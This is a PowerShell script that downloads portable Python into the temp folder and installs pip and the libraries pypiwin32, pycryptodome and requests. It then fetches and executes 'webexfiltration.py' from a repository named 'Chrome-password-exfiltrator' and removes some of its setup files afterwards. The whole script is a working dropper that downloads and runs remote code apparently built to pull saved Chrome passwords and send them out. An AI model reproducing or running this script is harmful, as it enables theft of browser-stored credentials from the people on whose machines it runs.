# Variable Configuration
$PythonVersion = "3.11.5"
$PythonDownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-embed-amd64.zip"
$GetPipUrl = "https://bootstrap.pypa.io/get-pip.py"
$PythonPortablePath = Join-Path $env:TEMP "PythonPortable"
$PythonZipPath = Join-Path $env:TEMP "python-embed.zip"
$GetPipPath = Join-Path $PythonPortablePath "get-pip.py"
$ScriptDownloadUrl = "https://raw.githubusercontent.com/Krook9d/Chrome-password-exfiltrator/main/webexfiltration.py"
$ScriptPath = Join-Path $PythonPortablePath "webexfiltration.py"

# Create the temporary folder
if (-Not (Test-Path $PythonPortablePath)) {
    New-Item -ItemType Directory -Path $PythonPortablePath | Out-Null
}

# Download Python Portable
Invoke-WebRequest -Uri $PythonDownloadUrl -OutFile $PythonZipPath -ErrorAction Stop

# Extract Python Portable
Expand-Archive -Path $PythonZipPath -DestinationPath $PythonPortablePath -Force

# Complete paths
$PythonExePath = Join-Path $PythonPortablePath "python.exe"
$ScriptsPath = Join-Path $PythonPortablePath "Scripts"
$PipPath = Join-Path $ScriptsPath "pip.exe"

# Download get-pip.py
Invoke-WebRequest -Uri $GetPipUrl -OutFile $GetPipPath

# Modify the python39._pth file to enable modules
$PythonPathFile = Get-ChildItem -Path $PythonPortablePath -Filter "python*._pth" | Select-Object -First 1
if ($PythonPathFile) {
    $content = Get-Content $PythonPathFile.FullName
    $newContent = $content | Where-Object { $_ -ne "#import site" }
    $newContent += "import site"
    Set-Content -Path $PythonPathFile.FullName -Value $newContent
}

# Install pip
Start-Process -NoNewWindow -Wait -FilePath $PythonExePath -ArgumentList @($GetPipPath, "--force-reinstall")

# Update pip and setuptools
Start-Process -NoNewWindow -Wait -FilePath $PythonExePath -ArgumentList @("-m", "pip", "install", "--upgrade", "pip", "setuptools")

# Download the Python script
Invoke-WebRequest -Uri $ScriptDownloadUrl -OutFile $ScriptPath

# Verify if the script was successfully downloaded
if (-Not (Test-Path $ScriptPath)) {
    Write-Host "The Python script is not available: $ScriptPath" -ForegroundColor Red
    exit 1
}

# Install necessary dependencies
Start-Process -NoNewWindow -Wait -FilePath $PythonExePath -ArgumentList @("-m", "pip", "install", "pypiwin32", "pycryptodome", "requests")

# Execute the script
Start-Process -NoNewWindow -Wait -FilePath $PythonExePath -ArgumentList $ScriptPath

# Cleanup
Remove-Item -Path $PythonZipPath -Force
Remove-Item -Path $GetPipPath -Force

Write-Host "Script completed successfully!" -ForegroundColor Green
